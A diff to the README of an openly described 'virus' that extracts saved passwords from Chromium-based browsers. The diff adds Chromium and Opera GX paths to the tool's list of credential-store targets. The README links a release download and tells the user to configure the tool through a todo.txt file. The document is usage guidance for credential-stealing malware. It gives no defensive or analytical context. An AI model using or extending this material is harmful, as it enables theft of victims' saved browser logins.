@@ -5,6 +5,11 @@ Virus for extracting saved passwords from chromium based browsers
 
 1. Make sure to use correct version of the virus (brave or chrome, latest release is modular witch means that it can be used on both browsers so just ignore this and skip to downloading) and download it from [this](https://github.com/Josakko/BrowserPasswordExtractor/releases/tag/v2) link 
 2. Replace data from `todo.txt` file whit correct one and also for line 4 and 5 make sure to use one of following strings or make your own:
+#### Chromium
+
+    AppData\Local\Chromium\User Data\Local State
+    AppData\Local\Chromium\User Data\Default\Login Data
+
 #### Chrome
 
     AppData/Local/Google/Chrome/User Data/Local State
@@ -24,6 +29,11 @@ Virus for extracting saved passwords from chromium based browsers
 
     AppData/Roaming/Opera Software/Opera Stable/Local State
     AppData/Roaming/Opera Software/Opera Stable/Login Data
+
+## Opera GX
+
+    AppData\Roaming\Opera Software\Opera GX Stable\Local State
+    AppData\Roaming\Opera Software\Opera GX Stable\Login Data
 
 #### Vivaldi
 
